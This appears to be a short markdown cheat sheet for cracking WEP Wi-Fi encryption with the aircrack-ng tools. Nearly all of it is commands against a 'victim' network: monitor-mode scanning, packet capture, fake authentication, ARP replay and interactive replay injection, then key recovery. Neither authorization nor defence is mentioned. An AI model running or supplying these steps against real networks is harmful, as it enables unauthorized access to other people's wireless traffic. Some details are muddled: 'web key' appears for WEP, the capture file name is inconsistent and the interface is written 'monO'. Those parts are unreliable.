Wireless Equivalent Privacy.
Most WEP keys can be recovered or cracked within 3 minutes.

To crack it, it is needed the following target's information:
- ESSID
- BSSID
- Wireless channel
- Client's MAC

---
Start a **WEP** attack:

- Connect to the victim's machine by ssh
- Identify the available wireless network interfaces:
````
airmon-ng
````
- Locate the target wireless network:
````
airodump-ng monO #mono is the monitor to pick
````
- When airodump locates de target, press Ctrl+C to stop the search
- Copy the MAC address in the BSSID and note the channel
- Open in other terminal airodump-ng to sniff wireless
````
airodump-ng --bssid victim's_mac_address -c channel -w file.txt 

#after bssid you must put the mac address that you obtained before and the -c indicates the channel
````
- Open another terminal without closing the before one and fake an authentication:
````
aireplay-ng -1 0 -a victim's_mac_address -h attacker's_mac_address -e VICTIM'S_ESSID monO --ignore-negative-one

#-1 indicates fake authentication, mono is the monitor to pick
````
- Once we get the fake authentication, we will generate traffic that appears to come from a trusted MAC:
````
aireplay-ng -3 -b victim's_mac_address -h attacker's_mac_address monO --ignore-negative-one

#Here we are making an ARP injection or ARP replay attack
````
- While the ARP continues, open another terminal and write:
````
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b victim's_mac_address -h attacker's_mac_address monO --ignore-negative-one

#-2 indicates that we are using the Interactive Replay Attack, -c sets the destination to send the packets to all the hosts on the network
````
- Go back to the sniffing windows

You must wait until the data field value is above 5000
- Then, stop everything
- Now, in a new terminal execute:
````
aircrack-ng -a 1 -b victim's_mac_address -n 64 web_log-01.cap

#this command is used to crack the web key
````
